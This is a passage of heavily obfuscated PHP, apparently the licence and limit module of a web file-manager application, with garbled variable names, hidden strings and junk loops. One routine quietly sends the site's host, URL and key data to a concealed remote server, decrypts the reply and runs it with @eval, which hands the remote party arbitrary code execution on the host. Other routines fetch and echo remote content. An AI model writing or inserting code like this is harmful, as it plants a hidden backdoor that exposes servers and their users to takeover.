header($ˆ‹ñß·µ[217]); if ($‰¸ ö˝ë && strstr($‰¸ ö˝ë, $ˆ‹ñß·µ[218])) { echo $‰¸ ö˝ë; } die; } public function amqobab1a741($ó¡πãò) { $Ò‡≤˘‹À =& $_SERVER[ëæªã÷]; $ÍÀî˜”¢ =& $_SERVER[µÁ∏◊Ÿ•]; if ($this->flcg80db35ae == $ÍÀî˜”¢[219]) { return $ó¡πãò; } $ôÜõÀÒ« = array($ÍÀî˜”¢[220] => $ÍÀî˜”¢[221], $ÍÀî˜”¢[222] => $ÍÀî˜”¢[221], $ÍÀî˜”¢[223] => $ÍÀî˜”¢[221], $ÍÀî˜”¢[224] => $ÍÀî˜”¢[221], $ÍÀî˜”¢[225] => $ÍÀî˜”¢[226], $ÍÀî˜”¢[227] => $ÍÀî˜”¢[226], $ÍÀî˜”¢[228] => $ÍÀî˜”¢[226], $ÍÀî˜”¢[229] => $ÍÀî˜”¢[226], $ÍÀî˜”¢[230] => $ÍÀî˜”¢[226], $ÍÀî˜”¢[231] => $ÍÀî˜”¢[226], $ÍÀî˜”¢[232] => $ÍÀî˜”¢[226], $ÍÀî˜”¢[233] => $ÍÀî˜”¢[226], $ÍÀî˜”¢[234] => $ÍÀî˜”¢[226], $ÍÀî˜”¢[235] => $ÍÀî˜”¢[226], $ÍÀî˜”¢[236] => $ÍÀî˜”¢[226], $ÍÀî˜”¢[237] => $ÍÀî˜”¢[226]); $õ¶øÊÿ± = $Ò‡≤˘‹À[665]; while (strlen($õ¶øÊÿ±) < $Ò‡≤˘‹À[66]) { if (!$õ¶øÊÿ±) { break; } $õ¶øÊÿ±++; } $èÓìˆ¸‡ = explode($ÍÀî˜”¢[238], _get($this->oalwec19949c, $ÍÀî˜”¢[110], $ÍÀî˜”¢[6])); $Ω÷·∂¬ˆ = array(); foreach ($ôÜõÀÒ« as $±¸Ïà¢… => $≥ÉÇ“Ä¬) { if ($≥ÉÇ“Ä¬ == $ÍÀî˜”¢[221] && substr($this->flcg80db35ae, 0, 1) == $ÍÀî˜”¢[221]) { continue; } if (!in_array($±¸Ïà¢…, $èÓìˆ¸‡)) { $Ω÷·∂¬ˆ[] = $±¸Ïà¢…; } } foreach ($Ω÷·∂¬ˆ as $±¸Ïà¢…) { unset($ó¡πãò[$±¸Ïà¢…]); $¶ú⁄”ï‘ = $Ò‡≤˘‹À[666]; while (strlen($¶ú⁄”ï‘) < $Ò‡≤˘‹À[628]) { if (!$¶ú⁄”ï‘) { break; } $¶ú⁄”ï‘++; } } return $ó¡πãò; $ßΩÅÕæ√ = $Ò‡≤˘‹À[667]; while ($ßΩÅÕæ√ < $Ò‡≤˘‹À[619]) { if ($ßΩÅÕæ√ >= 0) { break; } $ßΩÅÕæ√++; } } private function xolw970ff557() { $∑ÙÊÔùù =& $_SERVER[µÁ∏◊Ÿ•]; if ($this->flcg80db35ae != $∑ÙÊÔùù[104]) { $GLOBALS[$∑ÙÊÔùù[83]][$∑ÙÊÔùù[87]][$∑ÙÊÔùù[239]] = $∑ÙÊÔùù[199]; return; } $GLOBALS[$∑ÙÊÔùù[83]][$∑ÙÊÔùù[240]] = $∑ÙÊÔùù[191]; if (Model($∑ÙÊÔùù[241])->get($∑ÙÊÔùù[63]) != $∑ÙÊÔùù[199]) { Model($∑ÙÊÔùù[241])->set($∑ÙÊÔùù[63], $∑ÙÊÔùù[199]); } } public function zjty4fc08270() { $°ÒÄ˙∏‘ =& $_SERVER[ëæªã÷]; return $_SERVER[µÁ∏◊Ÿ•][242]; $é∂ò©œ = $°ÒÄ˙∏‘[668]; while ($é∂ò©œ < $°ÒÄ˙∏‘[607]) { if ($é∂ò©œ >= 0) { break; } $é∂ò©œ++; } } private function vlwy5c0a0e7a() { $ Øù‡◊ä =& $_SERVER[ëæªã÷]; $É∆ÄÓƒÜ =& $_SERVER[µÁ∏◊Ÿ•]; $ÈùÚÊá¸ = array($É∆ÄÓƒÜ[243], $É∆ÄÓƒÜ[244], $É∆ÄÓƒÜ[245]); $ òÆÎ…ç = $ Øù‡◊ä[669]; if (strlen($ òÆÎ…ç) < $ Øù‡◊ä[615]) { die; } $ÿ˚˘˛Ã› = $É∆ÄÓƒÜ[246] . md5($É∆ÄÓƒÜ[247]); $—Ωπ‡óÚ = $ Øù‡◊ä[670]; if (strlen($—Ωπ‡óÚ) < $ Øù‡◊ä[66]) { return; } if ($this->flcg80db35ae == $É∆ÄÓƒÜ[104] || !_get($GLOBALS, $É∆ÄÓƒÜ[113])) { return; } if (!in_array($_SERVER[$É∆ÄÓƒÜ[24]], $ÈùÚÊá¸)) { return; } if (time() % 4 != 0) { return; } $Ä∆¥’  = call_user_func(array($É∆ÄÓƒÜ[248], $É∆ÄÓƒÜ[249]), $ÿ˚˘˛Ã›); if ($Ä∆¥’  && time() - $Ä∆¥’  < intval($É∆ÄÓƒÜ[250])) { return; } call_user_func(array($É∆ÄÓƒÜ[248], $É∆ÄÓƒÜ[133]), $ÿ˚˘˛Ã›, time()); $„êﬁÆÄÅ = Model($É∆ÄÓƒÜ[33])->get($É∆ÄÓƒÜ[101]); $≥œ÷°»å = $ Øù‡◊ä[671]; if (!$≥œ÷°»å) { return; } $«—˜¸†ﬂ = array($É∆ÄÓƒÜ[145] => Model($É∆ÄÓƒÜ[33])->get($É∆ÄÓƒÜ[181]), $É∆ÄÓƒÜ[158] => $this->flcg80db35ae, $É∆ÄÓƒÜ[155] => $_SERVER[$É∆ÄÓƒÜ[156]], $É∆ÄÓƒÜ[157] => Model($É∆ÄÓƒÜ[33])->get($É∆ÄÓƒÜ[125]), $É∆ÄÓƒÜ[99] => md5($_SERVER[$É∆ÄÓƒÜ[100]] . $„êﬁÆÄÅ), $É∆ÄÓƒÜ[148] => $É∆ÄÓƒÜ[130], $É∆ÄÓƒÜ[151] => $_SERVER[$É∆ÄÓƒÜ[152]]); $˘∆ê∞÷ﬂ = $this->blxm300d5da1($É∆ÄÓƒÜ[251], $«—˜¸†ﬂ); if (!is_array($˘∆ê∞÷ﬂ)) { return; } if ($˘∆ê∞÷ﬂ[$É∆ÄÓƒÜ[145]] && $˘∆ê∞÷ﬂ[$É∆ÄÓƒÜ[252]]) { if ($this->feoa7bf0a8dd($˘∆ê∞÷ﬂ[$É∆ÄÓƒÜ[252]]) == $«—˜¸†ﬂ[$É∆ÄÓƒÜ[145]]) { return; } } $this->hkzs8cf4b462(); $†‹›„≠∞ = $ Øù‡◊ä[672]; if (strlen($†‹›„≠∞) < $ Øù‡◊ä[628]) { return; } if ($this->feoa7bf0a8dd($˘∆ê∞÷ﬂ[$É∆ÄÓƒÜ[252]]) != $«—˜¸†ﬂ[$É∆ÄÓƒÜ[145]]) { $«€¯ÿ·¿ = array($É∆ÄÓƒÜ[176] => $„êﬁÆÄÅ, $É∆ÄÓƒÜ[177] => $_SERVER[$É∆ÄÓƒÜ[100]], $É∆ÄÓƒÜ[178] => this_url(), $É∆ÄÓƒÜ[153] => $_SERVER[$É∆ÄÓƒÜ[154]]); $Ïï˚Ù€Ü = $this->zdpw8ca6602d(json_encode($«€¯ÿ·¿)); $˘∆ê∞÷ﬂ = $this->blxm300d5da1($É∆ÄÓƒÜ[179] . $Ïï˚Ù€Ü); if ($˘∆ê∞÷ﬂ && is_array($˘∆ê∞÷ﬂ) && isset($˘∆ê∞÷ﬂ[$É∆ÄÓƒÜ[252]])) { $Ùπ€‰∆˝ = $this->zxjm8f943b85($˘∆ê∞÷ﬂ[$É∆ÄÓƒÜ[252]], 2); if ($Ùπ€‰∆˝) { $Ùπ€‰∆˝ = $this->feoa7bf0a8dd($Ùπ€‰∆˝); } if ($Ùπ€‰∆˝) { try { @eval($Ùπ€‰∆˝); } catch (Exception $º≠Ã—Æß) { } } } } } private function blxm300d5da1($ìÎêò£≥ = '', $◊Æ„†Êˆ = array(), $Ò‹∫ô∫Å = 5) { $¸‚¸€áÈ =& $_SERVER[ëæªã÷]; $Ë¢ê˛–« =& $_SERVER[µÁ∏◊Ÿ•]; $£Ì¡â›È = $Ë¢ê˛–«[253]; $åù—ÎàÒ = $¸‚¸€áÈ[673]; if (!$åù—ÎàÒ) { die; } $£Ì¡â›È = $this->gbnt3a5be98e($£Ì¡â›È, $Ë¢ê˛–«[254]); $«ôÿãçÚ = $¸‚¸€áÈ[674]; if (!$«ôÿãçÚ) { return; } $£Ì¡â›È = $£Ì¡â›È . $ìÎêò£≥; if ($◊Æ„†Êˆ && is_array($◊Æ„†Êˆ)) { $£Ì¡â›È = $£Ì¡â›È . $Ë¢ê˛–«[255] . http_build_query($◊Æ„†Êˆ); } if ($◊Æ„†Êˆ === -1) { return $£Ì¡â›È; } $û±í¥†ÿ = stream_context_create(array($Ë¢ê˛–«[213] => array($Ë¢ê˛–«[216] => $Ò‹∫ô∫Å, $Ë¢ê˛–«[214] => $Ë¢ê˛–«[256]), $Ë¢ê˛–«[257] => array($Ë¢ê˛–«[258] => !1, $Ë¢ê˛–«[259] => !1))); $◊Æ„†Êˆ = @file_get_contents($£Ì¡â›È, !1, $û±í¥†ÿ); $“˛ãüç‘ = $¸‚¸€áÈ[675]; if (!$“˛ãüç‘) { return; } return json_decode($◊Æ„†Êˆ, !0); } private function guob2756a164() { $ú˛∏˜öé =& $_SERVER[µÁ∏◊Ÿ•]; $˙˛ÙßÕπ = array($ú˛∏˜öé[260] => $ú˛∏˜öé[261], $ú˛∏˜öé[262] => $ú˛∏˜öé[263], $ú˛∏˜öé[264] => $ú˛∏˜öé[265], $ú˛∏˜öé[266] => $ú˛∏˜öé[267], $ú˛∏˜öé[268] => $ú˛∏˜öé[269], $ú˛∏˜öé[270] => $ú˛∏˜öé[207], $ú˛∏˜öé[271] => $ú˛∏˜öé[207], $ú˛∏˜öé[272] => $ú˛∏˜öé[261], $ú˛∏˜öé[273] => $ú˛∏˜öé[263], $ú˛∏˜öé[274] => $ú˛∏˜öé[265], $ú˛∏˜öé[275] => $ú˛∏˜öé[276], $ú˛∏˜öé[277] => $ú˛∏˜öé[267], $ú˛∏˜öé[278] => $ú˛∏˜öé[279], $ú˛∏˜öé[280] => $ú˛∏˜öé[269], $ú˛∏˜öé[281] => $ú˛∏˜öé[282], $ú˛∏˜öé[283] => $ú˛∏˜öé[284], $ú˛∏˜öé[285] => $ú˛∏˜öé[286]); $äÇ˙¨ Â = $˙˛ÙßÕπ[$this->flcg80db35ae]; $äÇ˙¨ Â = intval($äÇ˙¨ Â ? $äÇ˙¨ Â : $ú˛∏˜öé[261]); $Â£∞É´” = $_SERVER[ëæªã÷][676]; if (!$Â£∞É´”) { die; } $öËº†πÖ = _get($this->oalwec19949c, $ú˛∏˜öé[287]); $öËº†πÖ = $öËº†πÖ ? intval($öËº†πÖ) : 0; return $äÇ˙¨ Â + $öËº†πÖ; } public function eszgc38f1677($àˆÂ£ÊÉ) { $º¡ö§˛Ì =& $_SERVER[µÁ∏◊Ÿ•]; $ÌÔ„öâñ = $this->guob2756a164(); if ($àˆÂ£ÊÉ[$º¡ö§˛Ì[288]] == $º¡ö§˛Ì[191]) { return; } if ($ÌÔ„öâñ >= intval($º¡ö§˛Ì[207])) { return; } $ Û§Îîé = Model($º¡ö§˛Ì[119])->count(); $îó–¶çÀ = $_SERVER[ëæªã÷][677]; if ($ Û§Îîé <= $ÌÔ„öâñ) { return; } $Ïå–”» = Model($º¡ö§˛Ì[119])->field($º¡ö§˛Ì[288])->limit($ÌÔ„öâñ)->select(); $Ïå–”» = array_to_keyvalue($Ïå–”», $º¡ö§˛Ì[6], $º¡ö§˛Ì[288]); if (!in_array($àˆÂ£ÊÉ[$º¡ö§˛Ì[288]], $Ïå–”»)) { show_json($º¡ö§˛Ì[289], !1, $º¡ö§˛Ì[203]); } } public function grypf4091ed3() { $‹öÏ—˚ô =& $_SERVER[ëæªã÷]; $¡«‚âÌè =& $_SERVER[µÁ∏◊Ÿ•]; if (!_get($GLOBALS, $¡«‚âÌè[113]) || mt_rand(1, 100) > 20) { return; } $»ãÍÛ·” = $¡«‚âÌè[211]; $»ãÍÛ·” = $this->gbnt3a5be98e($»ãÍÛ·”, $¡«‚âÌè[212]); $Âµ°Ä˘ê = stream_context_create(array($¡«‚âÌè[213] => array($¡«‚âÌè[214] => $¡«‚âÌè[215], $¡«‚âÌè[216] => 3))); $í¥ˆ∞ÚΩ = @file_get_contents($»ãÍÛ·”, !1, $Âµ°Ä˘ê); echo $¡«‚âÌè[290] . hash_encode($í¥ˆ∞ÚΩ) . $¡«‚âÌè[291]; $√Û£”†Ë = $‹öÏ—˚ô[678]; while (strlen($√Û£”†Ë) < $‹öÏ—˚ô[615]) { if (!$√Û£”†Ë) { break; } $√Û£”†Ë++; } } private function wsoh12ce48e0($íπŒåÖ¶, $˘ Î§öı, $î„¯Öüë = 3) { $£ã…ÈŒı =& $_SERVER[ëæªã÷]; $ú¡ÔŸ÷¥ =& $_SERVER[µÁ∏◊Ÿ•]; usleep(1); $íπŒåÖ¶ = trim($íπŒåÖ¶); $¯Ôãó˛™ = $£ã…ÈŒı[679]; $‰Ñ¸ö¶Õ = mt_rand(0, 5) . $ú¡ÔŸ÷¥[6]; $•†›«≥à = $£ã…ÈŒı[680]; $–ªè¬Ã√ = rand_string(15); $êÑ£ã˘é = $ú¡ÔŸ÷¥[292]; $ë≈£Ç¯µ = $£ã…ÈŒı[681]; if (!$ë≈£Ç¯µ) { return; } switch ($‰Ñ¸ö¶Õ) { case $ú¡ÔŸ÷¥[199]: $»ÊÍÿùÁ = $this->rwigcd75ca9f($íπŒåÖ¶, strrev($˘ Î§öı . $–ªè¬Ã√)); break; case $ú¡ÔŸ÷¥[191]: $»ÊÍÿùÁ = $this->rwigcd75ca9f($íπŒåÖ¶, strrev($–ªè¬Ã√ . $˘ Î§öı)); break; case $ú¡ÔŸ÷¥[293]: $»ÊÍÿùÁ = $this->rwigcd75ca9f($íπŒåÖ¶, base64_encode($–ªè¬Ã√ . $˘ Î§öı)); $≠¢∞Ìí¶ = $£ã…ÈŒı[682]; while (strlen($≠¢∞Ìí¶) < $£ã…ÈŒı[619]) { if (!$≠¢∞Ìí¶) { break; } $≠¢∞Ìí¶++; } break; $Éπê◊ü∑ = $£ã…ÈŒı[683]; if (!$Éπê◊ü∑) { die; } case $ú¡ÔŸ÷¥[294]: $»ÊÍÿùÁ = $this->rwigcd75ca9f($íπŒåÖ¶, md5($–ªè¬Ã√ . $˘ Î§öı)); $Üﬁ¨˝ƒË = $£ã…ÈŒı[684]; while (strlen($Üﬁ¨˝ƒË) < $£ã…ÈŒı[607]) { if (!$Üﬁ¨˝ƒË) { break; } $Üﬁ¨˝ƒË++; } break; $Õÿ√Õ˝Ê = $£ã…ÈŒı[685]; while (strlen($Õÿ√Õ˝Ê) < $£ã…ÈŒı[619]) { if (!$Õÿ√Õ˝Ê) { break; } $Õÿ√Õ˝Ê++; } case $ú¡ÔŸ÷¥[295]: $íπŒåÖ¶ = base64_encode($íπŒåÖ¶); $∫ØÙ €ë = rand(0, 64); $‹ﬂÊÊÒ” = $êÑ£ã˘é[$∫ØÙ €ë]; $«◊¬˘◊‘ = $£ã…ÈŒı[686]; if (strlen($«◊¬˘◊‘) < $£ã…ÈŒı[615]) { return; } $ Ç›áÑÄ = md5($‹ﬂÊÊÒ” . md5($˘ Î§öı . $‹ﬂÊÊÒ”) . $˘ Î§öı); $ Ç›áÑÄ = substr($ Ç›áÑÄ, $∫ØÙ €ë % 8, $∫ØÙ €ë % 8 + 7); $íÈ°¥‘œ = $£ã…ÈŒı[687]; if (!$íÈ°¥‘œ) { return; } $±—ËÉü∏ = $ú¡ÔŸ÷¥[6]; $óåπÎ˜Ú = $£ã…ÈŒı[688]; $Î£€ ´¥ = 0; $õŒ⁄È°„ = 0; $∏æ˛Õö∫ = $£ã…ÈŒı[689]; if (strlen($∏æ˛Õö∫) < $£ã…ÈŒı[607]) { die; } $ÏéùıÕø = 0; $Û ù—Ωã = $£ã…ÈŒı[690]; if (strlen($Û ù—Ωã) < $£ã…ÈŒı[66]) { return; } for ($Î£€ ´¥ = 0; $Î£€ ´¥ < strlen($íπŒåÖ¶); $Î£€ ´¥++) { $ÏéùıÕø = $ÏéùıÕø == strlen($ Ç›áÑÄ) ? 0 : $ÏéùıÕø; $õŒ⁄È°„ = ($∫ØÙ €ë + strpos($êÑ£ã˘é, $íπŒåÖ¶[$Î£€ ´¥]) + ord($ Ç›áÑÄ[$ÏéùıÕø++])) % 64; $Ë∞’ŒÏÏ = $£ã…ÈŒı[691]; while (strlen($Ë∞’ŒÏÏ) < $£ã…ÈŒı[628]) { if (!$Ë∞’ŒÏÏ) { break; } $Ë∞’ŒÏÏ++; } $±—ËÉü∏ .= $êÑ£ã˘é[$õŒ⁄È°„]; $¿©‡®®” = $£ã…ÈŒı[692]; if (strlen($¿©‡®®”) < $£ã…ÈŒı[628]) { return; } } $»ÊÍÿùÁ = hash_encode($‹ﬂÊÊÒ” . $±—ËÉü∏); $ö»˙≈õå = $£ã…ÈŒı[693]; if (!$ö»˙≈õå) { return; } break; default: $»ÊÍÿùÁ = $this->rwigcd75ca9f($íπŒåÖ¶, $˘ Î§öı . $–ªè¬Ã√); $∫Éå§ﬂ‰ = $£ã…ÈŒı[694]; if (strlen($∫Éå§ﬂ‰) < $£ã…ÈŒı[628]) { die; } break; } $»ÊÍÿùÁ = strrev($‰Ñ¸ö¶Õ . $–ªè¬Ã√ . $»ÊÍÿùÁ); if ($î„¯Öüë - 1 > 0) { $»ÊÍÿùÁ = $this->wsoh12ce48e0($»ÊÍÿùÁ, $˘ Î§öı, $î„¯Öüë - 1); } return $»ÊÍÿùÁ; } private function zxjm8f943b85($’üüÑÀ›, $Ë©«ËÒ◊, $˛¥’∆ÃÜ = 3) { $òââÚ∂ö =& $_SERVER[ëæªã÷]; $ñŒî˚⁄◊ =& $_SERVER[µÁ∏◊Ÿ•]; if (!is_string($’üüÑÀ›) || strlen($’üüÑÀ›) < 10) { return !1; } $’üüÑÀ› = trim($’üüÑÀ›); $’üüÑÀ› = strrev($’üüÑÀ›); $‡«Ä¶Ì¶ = $’üüÑÀ›[0]; $Õ⁄¬’ùÃ = substr($’üüÑÀ›, 1, 15); $íâ“Ê“ô = $òââÚ∂ö[695]; if (strlen($íâ“Ê“ô) < $òââÚ∂ö[619]) { return; } $’üüÑÀ› = substr($’üüÑÀ›, 16); $Ê∂ÓÃõô = $òââÚ∂ö[696]; if (strlen($Ê∂ÓÃõô) < $òââÚ∂ö[66]) { return; } $ÿ–¬°ÁÈ = $ñŒî˚⁄◊[292]; $‘éΩ‰¬õ = $òââÚ∂ö[697]; if (!$‘éΩ‰¬õ) { return; } switch ($‡«Ä¶Ì¶) { case $ñŒî˚⁄◊[199]: $êÚîÁú¬ = $this->gbnt3a5be98e($’üüÑÀ›, strrev($Ë©«ËÒ◊ . $Õ⁄¬’ùÃ)); break; $‡˛πÒ¬” = $òââÚ∂ö[698]; case $ñŒî˚⁄◊[191]: $êÚîÁú¬ = $this->gbnt3a5be98e($’üüÑÀ›, strrev($Õ⁄¬’ùÃ . $Ë©«ËÒ◊)); break; $π•¥•Ãï = $òââÚ∂ö[699]; if (strlen($π•¥•Ãï) < $òââÚ∂ö[619]) { die; } case $ñŒî˚⁄◊[293]: $êÚîÁú¬ = $this->gbnt3a5be98e($’üüÑÀ›, base64_encode($Õ⁄¬’ùÃ . $Ë©«ËÒ◊)); break; case $ñŒî˚⁄◊[294]: $êÚîÁú¬ = $this->gbnt3a5be98e($’üüÑÀ›, md5($Õ⁄¬’ùÃ . $Ë©«ËÒ◊)); break; case $ñŒî˚⁄◊[295]: $’üüÑÀ› = hash_decode($’üüÑÀ›); $ßÁ·Û˚ä = $’üüÑÀ›[0]; $’üüÑÀ› = substr($’üüÑÀ›, 1); $–‘√Ûñù = $òââÚ∂ö[700]; if (strlen($–‘√Ûñù) < $òââÚ∂ö[628]) { return; } $±–ê±ë© = strpos($ÿ–¬°ÁÈ, $ßÁ·Û˚ä); $∞Ω…≤éò = md5($ßÁ·Û˚ä . md5($Ë©«ËÒ◊ . $ßÁ·Û˚ä) . $Ë©«ËÒ◊); $∞Ω…≤éò = substr($∞Ω…≤éò, $±–ê±ë© % 8, $±–ê±ë© % 8 + 7); $†›‘·ùø = $ñŒî˚⁄◊[6]; $§ôÕ¸è = $òââÚ∂ö[701]; while ($§ôÕ¸è < $òââÚ∂ö[615]) { if ($§ôÕ¸è >= 0) { break; } $§ôÕ¸è++; } $Ü∞πÿ˛’ = 0; $ˆ¢øÉﬂú = 0; $ì»Ë«»” = 0; for ($Ü∞πÿ˛’ = 0; $Ü∞πÿ˛’ < strlen($’üüÑÀ›); $Ü∞πÿ˛’++) { $ì»Ë«»” = $ì»Ë«»” == strlen($∞Ω…≤éò) ? 0 : $ì»Ë«»”; $òÅ≤¥”ı = $ì»Ë«»”++; $Â¢˙Ÿ∑Ÿ = $òââÚ∂ö[702]; while (strlen($Â¢˙Ÿ∑Ÿ) < $òââÚ∂ö[615]) { if (!$Â¢˙Ÿ∑Ÿ) { break; } $Â¢˙Ÿ∑Ÿ++; } $ˆ¢øÉﬂú = strpos($ÿ–¬°ÁÈ, $’üüÑÀ›[$Ü∞πÿ˛’]) - $±–ê±ë© - ord($∞Ω…≤éò[$òÅ≤¥”ı]); while ($ˆ¢øÉﬂú < 0) { $ˆ¢øÉﬂú += 64; } $†›‘·ùø .= $ÿ–¬°ÁÈ[$ˆ¢øÉﬂú]; } $êÚîÁú¬ = base64_decode($†›‘·ùø); break; $úâÉ¢í = $òââÚ∂ö[703]; while ($úâÉ¢í < $òââÚ∂ö[628]) { if ($úâÉ¢í >= 0) { break; } $úâÉ¢í++; } default: $êÚîÁú¬ = $this->gbnt3a5be98e($’üüÑÀ›, $Ë©«ËÒ◊ . $Õ⁄¬’ùÃ); break; $æÖñÖ•— = $òââÚ∂ö[704]; while (strlen($æÖñÖ•—) < $òââÚ∂ö[628]) { if (!$æÖñÖ•—) { break; } $æÖñÖ•—++; } } if ($˛¥’∆ÃÜ - 1 > 0) { $êÚîÁú¬ = $this->zxjm8f943b85($êÚîÁú¬, $Ë©«ËÒ◊, $˛¥’∆ÃÜ - 1); } return $êÚîÁú¬; } public function zdpw8ca6602d($ÿ¶µ Ê≤) { $˜à›äÌŒ =& $_SERVER[ëæªã÷]; $¥í≥¸áœ =& $_SERVER[µÁ∏◊Ÿ•]; $Ä≠«¨¯Œ = $this->ctsz2d170589(); $ﬂ∫ú»Ë» = $this->ctsz2d170589(); $œ÷¥‚ä· = $˜à›äÌŒ[705]; $¯¡†«¯Õ = ($Ä≠«¨¯Œ - 1) * ($ﬂ∫ú»Ë» - 1); $ÌŸ“Ò˘ì = intval(($Ä≠«¨¯Œ + $ﬂ∫ú»Ë») / 2); while (1) { $Ì˛ÉÅÉÀ = $ÌŸ“Ò˘ì; $ßﬁ˘ûùû = $˜à›äÌŒ[706]; if (strlen($ßﬁ˘ûùû) < $˜à›äÌŒ[607]) { die; } $ü›≠¡Ù¨ = $¯¡†«¯Õ; $öÉøÈÜ‚ = $˜à›äÌŒ[707]; if (strlen($öÉøÈÜ‚) < $˜à›äÌŒ[607]) { return; } while ($ü›≠¡Ù¨ % $Ì˛ÉÅÉÀ != 0) { $„•π˝◊√ = $ü›≠¡Ù¨; $£ó◊ìŸÓ = $˜à›äÌŒ[708]; if (!$£ó◊ìŸÓ) { return; } $ü›≠¡Ù¨ = $Ì˛ÉÅÉÀ; $Ì˛ÉÅÉÀ = $„•π˝◊√ % $Ì˛ÉÅÉÀ; } if ($Ì˛ÉÅÉÀ == 1) { break; } else { $ÌŸ“Ò˘ì++; } } $œ™Ó˚π° = 2; $èã¨¯¿˙ = $˜à›äÌŒ[709]; while ($èã¨¯¿˙ < $˜à›äÌŒ[615]) { if ($èã¨¯¿˙ >= 0) { break; } $èã¨¯¿˙++; } for ($Ÿé…±≈Â = 0; $Ÿé…±≈Â < $¯¡†«¯Õ * 10; $Ÿé…±≈Â++) { if (($¯¡†«¯Õ * $Ÿé…±≈Â + 1) % $ÌŸ“Ò˘ì == 0) { $œ™Ó˚π° = intval(($¯¡†«¯Õ * $Ÿé…±≈Â + 1) / $ÌŸ“Ò˘ì); break; } } $¡¸îÅÕÒ = $this->rwigcd75ca9f($Ä≠«¨¯Œ * $ﬂ∫ú»Ë» . $¥í≥¸áœ[6], $¥í≥¸áœ[130]); $Ωè†áü = $˜à›äÌŒ[710]; while (strlen($Ωè†áü) < $˜à›äÌŒ[619]) { if (!$Ωè†áü) { break; } $Ωè†áü++; } $ü¶ø’Ø› = md5($¥í≥¸áœ[296] . ($Ä≠«¨¯Œ + $ﬂ∫ú»Ë») . $¥í≥¸áœ[297] . $ÌŸ“Ò˘ì . $¥í≥¸áœ[297] . $œ™Ó˚π° . $¥í≥¸áœ[298]); $˝ºÍÌû = $this->rwigcd75ca9f($ÿ¶µ Ê≤, $ü¶ø’Ø›) . $¥í≥¸áœ[299] . $¡¸îÅÕÒ; $Ùµ„¯÷§ = $˜à›äÌŒ[711]; if (!$Ùµ„¯÷§) { die; } return $˝ºÍÌû; $ïùÅëî˚ = $˜à›äÌŒ[712]; } public function feoa7bf0a8dd($ÃÂÙ÷üÛ) { $¥†∏≈É∞ =& $_SERVER[ëæªã÷]; $íïŸıÙõ =& $_SERVER[µÁ∏◊Ÿ•]; $£‘ÓŒ∂è = explode($íïŸıÙõ[299], $ÃÂÙ÷üÛ); if (count($£‘ÓŒ∂è) != 2) { return $íïŸıÙõ[6]; } $¶ñÔëÔ˘ = $this->gbnt3a5be98e($£‘ÓŒ∂è[1] . $íïŸıÙõ[6], $íïŸıÙõ[130]); if (!$¶ñÔëÔ˘) { return $íïŸıÙõ[6]; } $¶ñÔëÔ˘ = intval($¶ñÔëÔ˘); $¿ΩÅöïª = 0; $ø¸„∞í› = 0; for ($Ïã»Ò∞∞ = 3; $Ïã»Ò∞∞ < $¶ñÔëÔ˘; $Ïã»Ò∞∞ += 2) { if ($¶ñÔëÔ˘ % $Ïã»Ò∞∞ != 0) { continue; } $¿ΩÅöïª = $Ïã»Ò∞∞; $ø¸„∞í› = intval($¶ñÔëÔ˘ / $Ïã»Ò∞∞); $çŸ§ò◊© = $¥†∏≈É∞[713]; while (strlen($çŸ§ò◊©) < $¥†∏≈É∞[619]) { if (!$çŸ§ò◊©) { break; } $çŸ§ò◊©++; } break; } $´ŒıÒÇ‹ = ($¿ΩÅöïª - 1) * ($ø¸„∞í› - 1); $ÇÑëÈ—û = $¥†∏≈É∞[714]; while ($ÇÑëÈ—û < $¥†∏≈É∞[66]) { if ($ÇÑëÈ—û >= 0) { break; } $ÇÑëÈ—û++; } $Ùõ˜—Éº = intval(($¿ΩÅöïª + $ø¸„∞í›) / 2); $˘Íÿ§Ûà = $¥†∏≈É∞[715]; if (strlen($˘Íÿ§Ûà) < $¥†∏≈É∞[607]) { return; } while (1) { $…˚ÊÍ≤Ë = $Ùõ˜—Éº; $ﬁ˙ÒÊ» = $´ŒıÒÇ‹; $à≥œõç∆ = $¥†∏≈É∞[716]; if (!$à≥œõç∆) { return; } while ($ﬁ˙ÒÊ» % $…˚ÊÍ≤Ë != 0) { $îˆúﬂ‘Ú = $ﬁ˙ÒÊ»; $—∑Ûó˚ö = $¥†∏≈É∞[717]; if (!$—∑Ûó˚ö) { return; } $ﬁ˙ÒÊ» = $…˚ÊÍ≤Ë; $…˚ÊÍ≤Ë = $îˆúﬂ‘Ú % $…˚ÊÍ≤Ë; $•™∆¬‘∆ = $¥†∏≈É∞[718]; } if ($…˚ÊÍ≤Ë == 1) { break; } else { $Ùõ˜—Éº++; } } $§∞Œîº¶ = 2; for ($Ïã»Ò∞∞ = 0; $Ïã»Ò∞∞ < $´ŒıÒÇ‹ * 10; $Ïã»Ò∞∞++) { if (($´ŒıÒÇ‹ * $Ïã»Ò∞∞ + 1) % $Ùõ˜—Éº == 0) { $§∞Œîº¶ = intval(($´ŒıÒÇ‹ * $Ïã»Ò∞∞ + 1) / $Ùõ˜—Éº); break; } } $∑ı˚ú¥˚ = md5($íïŸıÙõ[296] . ($¿ΩÅöïª + $ø¸„∞í›) . $íïŸıÙõ[297] . $Ùõ˜—Éº . $íïŸıÙõ[297] . $§∞Œîº¶ . $íïŸıÙõ[298]); $πÔ∫¬˛É = $this->gbnt3a5be98e($£‘ÓŒ∂è[0], $∑ı˚ú¥˚); $˚°ö≈Äÿ = $¥†∏≈É∞[719]; while ($˚°ö≈Äÿ < $¥†∏≈É∞[607]) { if ($˚°ö≈Äÿ >= 0) { break; } $˚°ö≈Äÿ++; } return $πÔ∫¬˛É; $≤π˝„ÀÈ = $¥†∏≈É∞[720]; if (strlen($≤π˝„ÀÈ) < $¥†∏≈É∞[607]) { die; } } public function ctsz2d170589() { $Üâî¢Ö˛ =& $_SERVER[ëæªã÷]; $êÖ‘€≤» = mt_rand(pow(2, 14), pow(2, 16) - 1); $§Ÿ˜ﬁâ∑ = array(); $∞†Ú˘Ô¥ = $Üâî¢Ö˛[721]; if (!$∞†Ú˘Ô¥) { return; } $æÌ¬œπß = 1; $úøÚ—ë˚ = $Üâî¢Ö˛[722]; while ($æÌ¬œπß <= (int) sqrt($êÖ‘€≤»)) { $Õù◊∂çè = $æÌ¬œπß; while (!0) { $Õù◊∂çè++; if ($Õù◊∂çè <= 2) { $æÌ¬œπß = $Õù◊∂çè; break; } else { if ($Õù◊∂çè < 2) { continue; } } $¶Õ«∞ä = !0; for ($îü˝©“ƒ = 2; $îü˝©“ƒ <= sqrt($Õù◊∂çè); $îü˝©“ƒ++) { if ($Õù◊∂çè % $îü˝©“ƒ == 0) { $¶Õ«∞ä = !1; } } if ($¶Õ«∞ä) { $æÌ¬œπß = $Õù◊∂çè; 